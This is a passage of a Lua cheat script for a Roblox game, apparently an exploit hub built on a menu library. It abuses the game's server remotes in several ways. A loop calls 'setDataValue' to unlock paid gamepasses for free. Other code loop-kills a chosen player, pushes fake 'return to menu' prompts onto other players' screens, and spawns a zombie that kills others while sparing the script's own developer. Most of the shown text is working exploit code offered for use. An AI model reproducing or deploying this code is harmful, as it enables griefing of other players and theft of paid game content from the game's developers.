	if part.Parent:findFirstChildOfClass("Humanoid") and part.Name ~= "pospart" and candmg then
		if part.Parent:findFirstChildOfClass("Humanoid").Health <= 4 and part.Parent:findFirstChildOfClass("Humanoid").Health > 0 then
			if part.Parent.Name ~= Player.Name and v.Name ~= Ranks.Developer.UserName and v.Name ~= Ranks.Holder.Name then
			part.Parent.Head.CFrame = CFrame.new(part.Parent.Head.Position, head.Position)
			TKill(part.Parent.Name)
			wait(0.3)
			else
			    return
			end
		else
		    if part.Parent.Name ~= Player.Name and part.Parent.Name ~= Ranks.Developer.UserName and part.Parent.Name ~= Ranks.Holder.Name then
			TKill(part.Parent.Name)
			wait(0.3)
			else
			    return
			end
		end
	end
end
torso.Touched:connect(damage)
spawn(walkrandomly)
spawn(chase)
while step:wait() and zombie and zombie:findFirstChild("Head") do --check animations and other things
	sine = sine + 1
	if not walking then
		neck.C0 = neck.C0:lerp(CFrame.new(0,1.2,0) * CFrame.Angles(math.sin(sine/30)/10,0,0) * CFrame.new(0,0.25,0),0.1)
		righthip.C0 = righthip.C0:lerp(CFrame.new(0.5,-1-math.cos(sine/30)/15,0) * CFrame.Angles(math.rad(10+(2*math.sin(-sine/30))),0,-math.sin(sine/60)/10) * CFrame.new(0,-1,0),0.1)
		lefthip.C0 = lefthip.C0:lerp(CFrame.new(-0.5,-1-math.cos(sine/30)/15,0) * CFrame.Angles(math.rad(10+(2*math.sin(-sine/30))),0,-math.sin(sine/60)/10) * CFrame.new(0,-1,0),0.1)
		root.C0 = root.C0:lerp(CFrame.new(0,math.cos(sine/30)/15,0) * CFrame.Angles(math.rad(-10+(2*math.sin(sine/30))),0,math.sin(sine/60)/15),0.1)
		rightshoulder.C0 = rightshoulder.C0:lerp(CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(20)+math.rad(5*math.sin(sine/30)),0,math.rad(5*math.cos(sine/30)/2)) * CFrame.new(0,-0.5,0),0.1)
		leftshoulder.C0 = leftshoulder.C0:lerp(CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(20)-math.rad(5*math.sin(sine/30)),0,-math.rad(5*math.cos(sine/30)/2)) * CFrame.new(0,-0.5,0),0.1)
	end
	if walking then --this is the walking animation
		leftshoulder.C0 = leftshoulder.C0:lerp(CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(100-math.cos(sine/5)*10),0,math.rad(math.sin(sine/10)*10)) * CFrame.new(0,-0.5,0),0.1)
		rightshoulder.C0 = rightshoulder.C0:lerp(CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(100-math.cos(sine/5)*10),0,math.rad(math.sin(sine/10)*10)) * CFrame.new(0,-0.5,0),0.1)
		neck.C0 = neck.C0:lerp(CFrame.new(0,1.2,0) * CFrame.Angles(math.rad(10+math.cos(sine/5)*6),0,0) * CFrame.new(0,0.25,0),0.1)
		root.C0 = root.C0:lerp(CFrame.new(0,math.sin(sine/5)/9,0) * CFrame.Angles(math.rad(-15),0,math.cos(sine/10)/6),0.1)
		righthip.C0 = righthip.C0:lerp(CFrame.new(0.5,-1+math.cos(sine/10)/3,-math.cos(sine/10)/3) * CFrame.Angles(math.sin(sine/10),0,0) * CFrame.new(0,-1,0),0.1)
		lefthip.C0 = lefthip.C0:lerp(CFrame.new(-0.5,-1-math.cos(sine/10)/3,math.cos(sine/10)/3) * CFrame.Angles(-math.sin(sine/10),0,0) * CFrame.new(0,-1,0),0.1)
	end
end
end
coroutine.wrap(QMYBKK_fake_script)()
else
    ScriptFolder:WaitForChild("D00M Zombie").HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
end    
    
end
FEStuff:Button(
    "FE spawn/bring Zombie",
    function()
        FESpawnZombie()
    end
)

FEStuff:Button(
    "Remove spawned Ai",
    function()
        for i,v in pairs(ScriptFolder:GetChildren()) do
        if v.Name == "D00M Zombie" then
            v:Destroy()
            end
        end
    end
)
FEStuff:Seperator()
FEStuff:Label("Model Import")
FEStuff:Label("!You will be given a tool for placement!")
FEStuff:Label("!Click to place. R to rotate!")

local function ModelImport(id)

local ModelAllowed = false
local PartCount = 0
local Model = game:GetObjects("rbxassetid://"..AssetImportId)[1]
for i,v in pairs(Model:GetDescendants()) do
    if not v:IsA("Part") then
        v:Destroy()
    end
    if v:IsA("Part") then
        PartCount = PartCount + 1
        --table.insert(Parts,v)
    end
end

if PartCount > 500 then
    Model:Destroy()
    ChatMakeSystemMessage("info","error | Model has too many parts! | Limit is 500")
    ModelAllowed = false
    return 
    else
    ModelAllowed = true
end

if ModelAllowed then
function CreateModel()
	for i,v in pairs(Model:GetDescendants()) do
		if v:IsA("BasePart") then
			--_G.CreatePermPart(v,Workspace[game.Players.LocalPlayer.Name]["Secret Agent Shades"])
			CreatePermPart(v,workspace)
		end
	end
end

local ModelPlacementTool = Instance.new("Tool",Player.Backpack)
ModelPlacementTool.RequiresHandle = false
ModelPlacementTool.Enabled = true
ModelPlacementTool.Name = "Model Placement"

local ToolEquipped = false
local ModelPlaced = false
local ModelPlacePos

ModelPlacementTool.Equipped:Connect(function()
	if not ToolEquipped and not ModelPlaced then
		ToolEquipped = true
		Model = game:GetObjects("rbxassetid://"..AssetImportId)[1]
		Model.Parent = Player.Character
		if Model:FindFirstChildOfClass("Part") then
		    Model.PrimaryPart = Model:FindFirstChildOfClass("Part")
		    else
		        ChatMakeSystemMessage("info","error")
		        wait(0.5)
		        ModelPlacementTool.Parent = nil
		        ModelPlacementTool:Destroy()
		        Model:Destroy()
		        return
		end
		while ToolEquipped and wait() do
			Model:MoveTo(Mouse.Hit.p)
		end
	end
end)
ModelPlacementTool.Unequipped:Connect(function()
	if ToolEquipped and not ModelPlaced then
		ToolEquipped = false
		Model:Destroy()
		local Model
		Model = Model
	end
end)


--Mouse.KeyDown:Connect(function(Key)
--	if Key == "r" then
--	    if ToolEquipped and not ModelPlaced then
--	        Model:SetPrimaryPartCFrame(Model:GetPrimaryPartCFrame() * CFrame.Angles(0, math.rad(50), 0))
--		end
--	end
--end)
	

ModelPlacementTool.Activated:Connect(function()
	if ToolEquipped and not ModelPlaced then
	    ModelPlaced = true
	    ToolEquipped = false
	    ModelPlacePos = Mouse.Hit.p
	    ModelPlacementTool:Destroy()
	    CreateModel()
	    Model:Destroy()
	   end
end)
end
end

FEStuff:Textbox(
    "Model ID",
    "Enter model ID here",
    false,
    function(id)
        AssetImportId = id
    end
)

FEStuff:Button(
    "Import model",
    function()
        if AssetImportCooldown then ChatMakeSystemMessage("warning","Importing is on cooldown. Please wait to use it again!") return end
        if AssetImportId ~= "" then
        AssetImportCooldown = true
        ModelImport(AssetImportId)
        wait(60)
        AssetImportCooldown = false
        end
    end
)

local ClothingChannel = EternalHubServer:Channel("clothing")
ClothingChannel:Label("Outfit Maker")
ClothingChannel:Button(
    "Remove Hats",
    function()
        workspace.resources.RemoteEvent:FireServer("removeHats")
    end
)
ClothingChannel:Label("Aircraft")
ClothingChannel:Button(
    "Pilot Headset",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Handle)
    end
)
ClothingChannel:Button(
    "Flight Goggles",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("Skylord Goggles"))
    end
)
ClothingChannel:Button(
    "Air flight Helmet",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.helmet)
    end
)
ClothingChannel:Button(
    "Pilot Clothing",
    function()
        ChangeClothing("236886923","454772491")
    end
)
ClothingChannel:Label("Police")
ClothingChannel:Button(
    "Cop Hat",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("Cop Hat"))
    end
)
ClothingChannel:Button(
    "Police Clothing",
    function()
        ChangeClothing("236889409","230773766")
    end
)
ClothingChannel:Label("Sheriff")
ClothingChannel:Button(
    "Troop Hat",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.troopHat)
    end
)
ClothingChannel:Button(
    "Sheriff Clothing",
    function()
        ChangeClothing("229581928","566262750")
    end
)
ClothingChannel:Label("Swat")
ClothingChannel:Button(
    "Scout Gear",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("Scout Gear"))
    end
)
ClothingChannel:Button(
    "Paintball Helmet",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.PaintballHelmet)
    end
)
ClothingChannel:Button(
    "Lifted Helmet and goggles",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Helmet2)
    end
)
ClothingChannel:Button(
    "Ninja Mask",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.NinjaMask)
    end
)
ClothingChannel:Button(
    "Swat Clothing",
    function()
        ChangeClothing("25655320","25888948")
    end
)
ClothingChannel:Label("Spec Ops")
ClothingChannel:Button(
    "Green Beret",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.blnaca)
    end
)
ClothingChannel:Button(
    "Headset",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Headset)
    end
)
ClothingChannel:Button(
    "Laidback Communicator",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.LaidBackCommunicator)
    end
)
ClothingChannel:Button(
    "Spec Ops Clothing",
    function()
        ChangeClothing("278309832","141031536")
    end
)
ClothingChannel:Label("Fugitive")
ClothingChannel:Button(
    "Bandana",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Robedana)
    end
)
ClothingChannel:Button(
    "Black bandana",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.bandana)
    end
)
ClothingChannel:Button(
    "Slick hair",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.hair)
    end
)
ClothingChannel:Button(
    "Fugitive Clothing",
    function()
        ChangeClothing("225670282","363801974")
    end
)
ClothingChannel:Label("Racer Helmets")
ClothingChannel:Button(
    "Red Racing Helmet",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("redRacer"))
    end
)
ClothingChannel:Button(
    "Blue Racing Helmet",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("blueRacer"))
    end
)
ClothingChannel:Button(
    "Black Racing Helmet",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("blackRacer"))
    end
)
ClothingChannel:Button(
    "Fire Racing Helmet",
    function()
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("fireRacer"))
    end
)
ClothingChannel:Label("!IDS MUST BE TEMPLATES!")
ClothingChannel:Textbox(
    "Shirt Template",
    "Enter Template ID here",
    false,
    function(id)
        EShirtId = id
    end
)
ClothingChannel:Textbox(
    "Pants Template",
    "Enter Template ID here",
    false,
    function(id)
        EPantsId = id
    end
)
ClothingChannel:Button(
    "Wear custom shirt",
    function()
    workspace.resources.RemoteEvent:FireServer("wearShirt","http://www.roblox.com/asset/?id="..EShirtId)
    end
)
ClothingChannel:Button(
    "Wear custom pants",
    function()
    workspace.resources.RemoteEvent:FireServer("wearPants","http://www.roblox.com/asset/?id="..EPantsId)
    end
)
local AccessoryNames = {"Headset","blnaca","PaintballHelmet","Shades","Skylord Goggles","Cop Hat","LaidBackCommunicator","blueRacer","redRacer","blackRacer","fireRacer","troopHat","Cap","Skylord","Handle","helmet","Helmet2","bandana","Robedana","NinjaMask","Scout Gear","hair"}
local SavedAccessories = {}
local SavedClothing = {}
local OutfitSaved = false
ClothingChannel:Button(
    "Save current outfit",
    function()  
        ChatMakeSystemMessage("info","Saving outfit. Please wait!")
        --SavedAccessories = nil
        table.clear(SavedAccessories)
        table.clear(SavedClothing)
        for i,object in pairs(Player.Character:GetChildren()) do
            --if object:IsA("Part") and object.Name ~= "Head" and object.Name ~= "Torso" and object.Name ~= "HumanoidRootPart" and object.Name ~= "Left Leg" and object.Name ~= "Right Leg" and object.Name ~= "Left Arm" and object.Name ~= "Right Arm" then
            for i,AccessoryName in pairs(AccessoryNames) do
                if object.Name == AccessoryName then
                    table.insert(SavedAccessories,object.Name)
                    --print(AccessoryName,object.Name)
                end
            end
        end
        if Player.Character:FindFirstChildOfClass("Shirt") then
            table.insert(SavedClothing,string.match(Player.Character.Shirt.ShirtTemplate,"%d+"))
            --print(string.match(Player.Character.Shirt.ShirtTemplate,"%d+"))
        end
        if Player.Character:FindFirstChildOfClass("Pants") then
            table.insert(SavedClothing,string.match(Player.Character.Pants.PantsTemplate,"%d+"))
            --print(string.match(Player.Character.Pants.PantsTemplate,"%d+"))
        end
        OutfitSaved = true
        ChatMakeSystemMessage("info","Outfit has been saved! Load it at anytime.")
    end
)
ClothingChannel:Button(
    "Load saved outfit",
    function()
        if OutfitSaved then
        workspace.resources.RemoteEvent:FireServer("removeHats")
        for i,accessoryName in pairs(SavedAccessories) do
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild(accessoryName))
        end
        ChangeClothing(SavedClothing[1],SavedClothing[2])
        ChatMakeSystemMessage("info","Outfit has been loaded!")
        else
            ChatMakeSystemMessage("info","You have no outfit saved! Please save one to load it.")
        end
    end
)
ClothingChannel:Seperator()
ClothingChannel:Label("Premade Loadouts")
ClothingChannel:Button(
    "Military General",
    function()
        workspace.resources.RemoteEvent:FireServer("removeHats")
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Headset)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.blnaca)
        ChangeClothing("5055683832","5055722754")
    end
)
ClothingChannel:Button(
    "Swat",
    function()
        workspace.resources.RemoteEvent:FireServer("removeHats")
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("Scout Gear"))
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.PaintballHelmet)
        ChangeClothing("9448937878","9799879648")
    end
)
ClothingChannel:Button(
    "Fugitive",
    function()
        workspace.resources.RemoteEvent:FireServer("removeHats")
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Robedana)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.hair)
        ChangeClothing("9884319682","9883863158")
    end
)
ClothingChannel:Button(
    "Hacker",
    function()
        workspace.resources.RemoteEvent:FireServer("removeHats")
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.hair)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Headset)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.bandana)
        ChangeClothing("9270620870","9271066788")
    end
)
ClothingChannel:Button(
    "Classic Military",
    function()
        workspace.resources.RemoteEvent:FireServer("removeHats")
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Cap)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Headset)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Shades)
        ChangeClothing("919805293","697473238")
    end
)
ClothingChannel:Button(
    "Winter Swat",
    function()
        workspace.resources.RemoteEvent:FireServer("removeHats")
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.bandana)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.hair)
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace:FindFirstChild("Scout Gear"))
        workspace.resources.RemoteEvent:FireServer("wearHat",workspace.Helmet2)
        ChangeClothing("6660311095","6660312275")
    end
)

--   ClothingChannel:Dropdown(
--    "Custom clothing",
--    {"Terrorist", "KFC uniform", "BurgerKing uniform", "Mcdonalds uniform", "Chick-fil-A uniform", "Dunkin'Donuts uniform"},
--    function(option)
--        if option == "Terrorist" then
--            ChangeClothing("228597358","1754360471")
--        elseif option == "KFC uniform" then
--                    ChangeClothing("1708307388","233193319")
--                            elseif option == "BurgerKing uniform" then
--        ChangeClothing("2228144035","9935646944")
--                            elseif option == "Mcdonalds uniform" then
--        ChangeClothing("1600210988","7349402842")
--                            elseif option == "Chick-fil-A uniform" then
--        ChangeClothing("1501716129","1501717372")
--                            elseif option == "Dunkin'Donuts uniform" then
--        ChangeClothing("213028219","1781455276")
--
--        end
--    end
--)

local ColorsChannel = EternalHubServer:Channel("colors")
ColorsChannel:Label("Laser ESP Color")
ColorsChannel:Colorpicker(
    "",
    LaserESPColor,
    function(color)
        LaserESPColor = color
    end
)
ColorsChannel:Label("Laser Color")
ColorsChannel:Colorpicker(
    "",
    LaserColor,
    function(color)
        LaserColor = color
    end
)
ColorsChannel:Label("Profly Color")
ColorsChannel:Colorpicker(
    "",
    ProflyColor,
    function(color)
        ProflyColor = color
    end
)
ColorsChannel:Label("ForceField Color")
ColorsChannel:Colorpicker(
    "",
    ForceFieldColor,
    function(color)
        ForceFieldColor = color
    end
)
ColorsChannel:Label("Smite Color")
ColorsChannel:Colorpicker(
    "",
    SmiteColor,
    function(color)
        SmiteColor = color
    end
)
ColorsChannel:Label("Paint Color")
ColorsChannel:Colorpicker(
    "",
    PaintColor,
    function(color)
        PaintColor = color
    end
)


Player.Character:WaitForChild("Humanoid").Died:Connect(function()
    if instantrespawntog then
    workspace.resources.RemoteEvent:FireServer("reloadMe")
    end
end)

Player.CharacterAdded:Connect(function(char)
    char:WaitForChild("Humanoid").Died:Connect(function()
        if instantrespawntog then
        workspace.resources.RemoteEvent:FireServer("reloadMe")
        end
    end)
end)

RunService.RenderStepped:Connect(function()
    if gamepasstog then
    wait(0.07)
    --print("looping")
    sv=function(a,b)
    game:GetService("Workspace").resources.RemoteFunction:InvokeServer("setDataValue",a,b)
    end
    gv=function(a)
    return game:GetService("Workspace").resources.RemoteFunction:InvokeServer("getDataValue",a)
    end
    sv("hasPilot",gamepasstog)
    sv("hasSwat",gamepasstog)
    sv("hasMerc",gamepasstog)
    sv("hasSpecOps",gamepasstog)
    end
    if prompttog then
        wait(0.07)
        firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"displayChoice",'returnToMenu',PromptMessage)
        lib.FireOtherClients("displayChoice",'returnToMenu',PromptMessage)
    end
    if loopkilltog then
        if Players:FindFirstChild(DevTarget) and Players:FindFirstChild(DevTarget).Character:FindFirstChildOfClass("Humanoid") and Players:FindFirstChild(DevTarget).Character.Humanoid.Health ~= 0 then
            TKill(DevTarget)
        end
    end
end)
--\\ Dev Stuff

local function StarName(user)
    for i,User in pairs(game:GetService("Players"):GetPlayers()) do
        if User.Name == Ranks.Developer.UserName or User.Name == Ranks.Holder.UserName then
            if workspace:FindFirstChild(User.Name) then
                local olddisplayname = User.Character.Humanoid.DisplayName 
                User.Character.Humanoid.DisplayName = "[⭐] "..olddisplayname
            end
        end
    end 
end
local function CreateOverHeadGui(user,ruser)
    local ch = user.Character
    local BGui = Instance.new("BillboardGui")
    local UserLabel = Instance.new("TextLabel",BGui)
    local ReturningUserLabel = Instance.new("TextLabel",BGui)
    BGui.Active = true
	BGui.ExtentsOffsetWorldSpace = Vector3.new(0,6,0)
	BGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	BGui.ClipsDescendants = true
	BGui.Size = UDim2.new(5,0,2,0)
	UserLabel.FontSize = Enum.FontSize.Size14
	UserLabel.TextColor3 = Color3.new(0.666667, 0, 0)
	UserLabel.TextStrokeColor3 = Color3.new(4/51,4/51,4/51)
	UserLabel.Text = user.Name
	UserLabel.Size = UDim2.new(1,0,0.550000011920929,0)
	UserLabel.TextStrokeTransparency = 0
	UserLabel.TextWrapped = true
	UserLabel.Font = Enum.Font.Fantasy
	UserLabel.BackgroundTransparency = 1
	UserLabel.TextSize = 14
	UserLabel.BackgroundColor3 = Color3.new(0,0,0.5,0)
	UserLabel.TextScaled = true
	UserLabel.BorderSizePixel = 0
	UserLabel.TextWrap = true
	ReturningUserLabel.FontSize = Enum.FontSize.Size14
	ReturningUserLabel.TextSize = 14
	ReturningUserLabel.TextColor3 = Color3.new(0.666667, 0, 0)
	ReturningUserLabel.TextStrokeColor3 = Color3.new(4/51,4/51,4/51)
	ReturningUserLabel.Text = "Returning User: "..ruser
	ReturningUserLabel.Size = UDim2.new(1,0,0.5,0)
	ReturningUserLabel.TextStrokeTransparency = 0
	ReturningUserLabel.TextWrapped = true
	ReturningUserLabel.Font = Enum.Font.Fantasy
	ReturningUserLabel.BackgroundTransparency = 1
	ReturningUserLabel.Position = UDim2.new(0,0,0.5,0)
	ReturningUserLabel.TextWrap = true
	ReturningUserLabel.TextScaled = true
	ReturningUserLabel.BorderSizePixel = 0
	ReturningUserLabel.BackgroundColor3 = Color3.new(1,1,1)
	BGui.Parent = ch.Head
end
local clientSound = nil
local function createClientSound(soundid)
    if clientSound ~= nil then clientSound:Destroy() end
    local Sound = Instance.new("Sound",workspace)
    Sound.SoundId = "rbxassetid://"..tostring(soundid)
    Sound.Volume = 2
    Sound.Looped = true
    Sound:Play()
    clientSound = Sound
    return
end
local function stopClientSound()
    clientSound:Destroy()
    return
end
local function clown(hum)
    if hum.Name ~= Ranks.Developer.UserName and hum.Name ~= Ranks.Holder.Name then
    local ch = hum.Character
    if Player.Name ~= Ranks.Developer.UserName and Player.Name ~= Ranks.Holder.Name then
    game.Workspace.resources.RemoteEvent:FireServer("removeHats")
    workspace.resources.RemoteEvent:FireServer("wearShirt","http://www.roblox.com/asset/?id=6557498873")
    workspace.resources.RemoteEvent:FireServer("wearPants","http://www.roblox.com/asset/?id=6557499397")
    else
        for i,v in pairs(hum:GetChildren()) do
            if v:IsA("Shirt") or v:IsA("Pants") then
                v:Destroy()
                end
        end
        local Shirt = Instance.new("Shirt",hum)
        Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=6557498873"
        local Pants = Instance.new("Pants",hum)
        Pants.PantsTemplate = "http://www.roblox.com/asset/?id=6557499397"
    end
    if ch.Head:FindFirstChild("face") then
        ch.Head.face.Texture = "http://www.roblox.com/asset/?id=629934434"
    end
    if ch:FindFirstChild("Body Colors") then
        ch["Body Colors"]:Destroy()
    end
    for i,v in pairs(ch:GetChildren()) do
        if v:IsA("BasePart") then
            v.Color = Color3.fromRGB(255,255,255)
        end
    end
    local Hat = Instance.new("Part")
    local HatMesh = Instance.new("SpecialMesh",Hat)
    local HatWeld = Instance.new("Weld",Hat)
    Hat.Size = Vector3.new(2, 2, 2)
    Hat.CanCollide = false
    HatMesh.MeshId = "http://www.roblox.com/asset/?id=15393031"
    HatMesh.TextureId = "http://www.roblox.com/asset/?id=15393013"
    HatMesh.Scale = Vector3.new(1, 1, 1)
    HatWeld.Part0 = Hat
    HatWeld.Part1 = ch.Head
    Hat.Parent = ch
    HatWeld.C0 = CFrame.new(0,0.15,0)
    end
end
local Time = nil
local function ClientTimeStop(TimeStopper)
Time = "Frozen"
local TweenService = game:GetService("TweenService")
local DESTABLE = {}
local ColorChange = Instance.new("ColorCorrectionEffect",game.Lighting)
local Blur = Instance.new("BlurEffect",game.Lighting)
Blur.Size = 0
local TimeFX = false
local Camera = game.Workspace.CurrentCamera
local Character = Player.Character
local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")

local CreateGui = function(Name, Text)
local DialogueGui = Instance.new("ScreenGui")
local DialogueFrame = Instance.new("Frame")
local Background = Instance.new("ImageLabel")
local NameTag = Instance.new("TextLabel")
local Shadow = Instance.new("TextLabel")
local DialogueSheet = Instance.new("Frame")
local Overlay = Instance.new("ImageLabel")
local Container = Instance.new("ScrollingFrame")
local TextLabel = Instance.new("TextLabel")
local Overlay_2 = Instance.new("ImageLabel")

--Properties:

DialogueGui.Name = "DialogueGui"
DialogueGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
DialogueGui.DisplayOrder = 2

DialogueFrame.Name = "DialogueFrame"
DialogueFrame.Parent = DialogueGui
DialogueFrame.AnchorPoint = Vector2.new(0.5, 0.5)
DialogueFrame.BackgroundColor3 = Color3.fromRGB(59, 62, 67)
DialogueFrame.BackgroundTransparency = 0.100
DialogueFrame.BorderSizePixel = 0
DialogueFrame.Position = UDim2.new(0.5, 0, 0.5, -300)
DialogueFrame.Size = UDim2.new(0, 500, 0, 125)

Background.Name = "Background"
Background.Parent = DialogueFrame
Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background.BackgroundTransparency = 1.000
Background.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background.BorderSizePixel = 0
Background.Position = UDim2.new(0, 0, 0.59523809, 0)
Background.Size = UDim2.new(1, 0, 0.00952380989, 0)
Background.Image = "http://www.roblox.com/asset/?id=4280494932"
Background.ImageColor3 = Color3.fromRGB(4, 5, 6)
Background.ImageTransparency = 0.870
Background.ScaleType = Enum.ScaleType.Tile
Background.TileSize = UDim2.new(0, 32, 0, 32)

NameTag.Name = "NameTag"
NameTag.Parent = DialogueFrame
NameTag.Active = true
NameTag.BackgroundColor3 = Color3.fromRGB(248, 248, 248)
NameTag.BackgroundTransparency = 1.000
NameTag.Position = UDim2.new(0, 10, 0, 2)
NameTag.Selectable = true
NameTag.Size = UDim2.new(1.00600004, -20, 0, 20)
NameTag.ZIndex = 2
NameTag.Font = Enum.Font.SourceSansSemibold
NameTag.Text = Name
NameTag.TextColor3 = Color3.fromRGB(247, 254, 255)
NameTag.TextSize = 20.000
NameTag.TextStrokeColor3 = Color3.fromRGB(52, 62, 66)
NameTag.TextStrokeTransparency = 0.000
NameTag.TextWrapped = true
NameTag.TextXAlignment = Enum.TextXAlignment.Left

Shadow.Name = "Shadow"
Shadow.Parent = NameTag
Shadow.Active = true
Shadow.BackgroundColor3 = Color3.fromRGB(248, 248, 248)
Shadow.BackgroundTransparency = 1.000
Shadow.Position = UDim2.new(0, 2, 0, 2)
Shadow.Selectable = true
Shadow.Size = UDim2.new(1, -20, 0, 20)
Shadow.Font = Enum.Font.SourceSansSemibold
Shadow.Text = Name
Shadow.TextColor3 = Color3.fromRGB(0, 0, 0)
Shadow.TextSize = 20.000
Shadow.TextStrokeColor3 = Color3.fromRGB(52, 62, 66)
Shadow.TextStrokeTransparency = 0.000
Shadow.TextTransparency = 0.500
Shadow.TextWrapped = true
Shadow.TextXAlignment = Enum.TextXAlignment.Left

DialogueSheet.Name = "DialogueSheet"
DialogueSheet.Parent = DialogueFrame
DialogueSheet.Active = true
DialogueSheet.BackgroundColor3 = Color3.fromRGB(229, 224, 202)
DialogueSheet.BorderSizePixel = 0
DialogueSheet.Position = UDim2.new(0, -1, 0, 25)
DialogueSheet.Size = UDim2.new(1, 2, 0, 100)

Overlay.Name = "Overlay"
Overlay.Parent = DialogueSheet
Overlay.AnchorPoint = Vector2.new(0.5, 0.5)
Overlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Overlay.BackgroundTransparency = 1.000
Overlay.Position = UDim2.new(0.5, 0, 0.5, 0)
Overlay.Size = UDim2.new(1, 4, 1, 4)
Overlay.Image = "http://www.roblox.com/asset/?id=4771248001"
Overlay.ImageColor3 = Color3.fromRGB(183, 197, 211)
Overlay.ScaleType = Enum.ScaleType.Slice
Overlay.SliceCenter = Rect.new(6, 6, 6, 6)

Container.Name = "Container"
Container.Parent = DialogueSheet
Container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container.BackgroundTransparency = 1.000
Container.BorderSizePixel = 0
Container.Size = UDim2.new(1, 0, 1, 0)
Container.BottomImage = "http://www.roblox.com/asset/?id=4292732835"
Container.CanvasSize = UDim2.new(0, 0, 0, 96)
Container.MidImage = "rbxassetid://6864023366"
Container.ScrollBarThickness = 8
Container.TopImage = "http://www.roblox.com/asset/?id=4292727598"
Container.VerticalScrollBarInset = Enum.ScrollBarInset.Always

TextLabel.Parent = Container
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.0208814405, 0, 0.0599999987, 0)
TextLabel.Size = UDim2.new(0, 483, 0, 88)
TextLabel.Font = Enum.Font.Fondamento
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 20.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Top

Overlay_2.Name = "Overlay"
Overlay_2.Parent = DialogueFrame
Overlay_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Overlay_2.BackgroundTransparency = 1.000
Overlay_2.BorderSizePixel = 0
Overlay_2.Position = UDim2.new(0, -3, 0, -3)
Overlay_2.Size = UDim2.new(1, 6, 0.590476215, 6)
Overlay_2.ZIndex = 2
Overlay_2.Image = "http://www.roblox.com/asset/?id=4280422108"
Overlay_2.ImageColor3 = Color3.fromRGB(183, 197, 211)
Overlay_2.ScaleType = Enum.ScaleType.Slice
Overlay_2.SliceCenter = Rect.new(14, 14, 18, 18)
function Type(label,text)
	for i = 1, #text, 1 do
		label.Text = string.sub(text, 1, i)
		wait()
	end
end
Type(TextLabel,Text)
wait(1)
DialogueGui:Destroy()
end
local makesound = function(soundid,speed,volume,parent)
	local sound = Instance.new("Sound")
	sound.SoundId = soundid
	sound.RollOffMaxDistance = 100
	sound.PlaybackSpeed =speed 
	sound.Volume = volume
	sound.Parent = parent
	sound:Play()
	game.Debris:AddItem(sound,sound.TimeLength+15)
	return sound
end
local Lerp = function(a, b, c)
	return a + ((b - a) * c)
end
local Distortval = 1
local MakeTween = function(timetack,easingstyle,easingdirection,repeats,flipflop)
	local newtween = TweenInfo.new(
		timetack, 
		easingstyle, 
		easingdirection, 
		repeats, 
		flipflop, 
		0 
	)
	return newtween
end
CreateGui(TimeStopper,"BEHOLD! The true power of time!")
wait(0.3)
local Twen = MakeTween(2.7/2,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,true)
local tween = TweenService:Create(Camera, Twen, {FieldOfView = 120})
tween:Play()
local Twen = MakeTween(2.7/2,Enum.EasingStyle.Linear,Enum.EasingDirection.In,0,false)
local tween = TweenService:Create(ColorChange, Twen, {Saturation = -2})
tween:Play()
spawn(function()
	wait(2.7/2)
